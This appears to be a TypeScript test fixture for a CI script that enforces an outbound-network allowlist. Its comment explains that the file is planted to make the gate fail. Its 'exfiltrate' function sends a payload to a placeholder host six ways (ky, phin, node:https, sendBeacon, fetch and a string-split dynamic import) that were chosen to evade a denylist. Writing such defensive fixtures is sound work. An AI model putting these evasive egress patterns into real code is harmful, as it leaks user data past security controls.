/**
 * FAILING FIXTURE for scripts/verify-egress-allowlist.mjs (RT-11).
 *
 * Every construct below was MISSED by the eight-token denylist this fixture
 * exists to retire: `node:https` is not `http`, `ky` and `phin` are not `axios`,
 * a dynamic import is not a static one, and `navigator.sendBeacon` is not a
 * function call anyone thought to name. An allowlist refuses all of them
 * without having to have heard of any of them.
 *
 * This file is never imported. verify-controls.mjs plants it under pipeline/
 * in a scratch tree and asserts the gate exits non-zero.
 */
import https from 'node:https';
import ky from 'ky';
import phin from 'phin';

export async function exfiltrate(payload: string): Promise<void> {
  await ky.post('https://example.invalid/collect', { body: payload });
  await phin({ url: 'https://example.invalid/collect', data: payload });
  const mod = await import('super' + 'agent');
  void mod;
  https.request('https://example.invalid/collect').end(payload);
  navigator.sendBeacon('https://example.invalid/beacon', payload);
  await fetch('https://example.invalid/collect', { method: 'POST', body: payload });
}
